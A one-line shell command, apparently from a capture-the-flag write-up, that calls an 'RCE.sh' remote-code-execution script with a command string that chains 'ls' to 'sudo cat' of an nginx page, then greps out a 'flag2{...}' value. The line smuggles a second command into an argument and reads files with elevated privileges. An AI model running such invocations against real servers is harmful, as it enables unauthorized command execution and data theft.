./RCE.sh $1 "ls ; sudo cat /usr/local/nginx/html/index_https.html" $2 | grep -o 'flag2{.*}' | recode html